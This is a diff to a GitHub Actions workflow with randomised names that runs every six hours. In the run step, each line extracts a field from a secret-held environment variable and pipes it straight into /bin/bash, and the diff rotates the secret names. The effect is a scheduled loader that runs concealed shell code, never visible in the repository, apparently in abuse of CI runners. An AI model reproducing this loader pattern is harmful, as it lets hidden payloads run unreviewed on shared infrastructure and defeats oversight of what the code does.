@@ -1,9 +1,8 @@
 name: elderlyremarkable
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
+    - cron: '45 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +10,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: elderlyremarkable
         env:
-          uo340: ${{ secrets.uo340 }}
+          nfm90: ${{ secrets.nfm90 }}
         run: |
-          echo $uo340 | jq -r .pomov7296 | /bin/bash
-          echo $bfs2421 | jq -r .ovjs7786 | /bin/bash
-          echo $ll34 | jq -r .qkwvt6 | /bin/bash
-          echo $g5972 | jq -r .enr101 | /bin/bash
-          echo $bpxo2 | jq -r .nwj24 | /bin/bash
-          echo $mnx1 | jq -r .g5825 | /bin/bash
-          echo $snum904 | jq -r .ns7 | /bin/bash
+          echo $nfm90 | jq -r .ndwml0 | /bin/bash
+          echo $hxvlg6 | jq -r .v5761 | /bin/bash
+          echo $omo748 | jq -r .fauwm72 | /bin/bash
+          echo $sigkm8 | jq -r .hsbt1192 | /bin/bash
+          echo $ht253 | jq -r .a4 | /bin/bash
+          echo $dyi81 | jq -r .u38 | /bin/bash
+          echo $nfuqr8 | jq -r .tbm4367 | /bin/bash
+          echo $o5 | jq -r .n0 | /bin/bash
+          echo $m86823 | jq -r .uwh4 | /bin/bash
+          echo $ij08 | jq -r .m940 | /bin/bash
+          echo $wik7542 | jq -r .pb842 | /bin/bash
+          echo $x3 | jq -r .fwm27 | /bin/bash
+          echo $x73121 | jq -r .e9 | /bin/bash
 
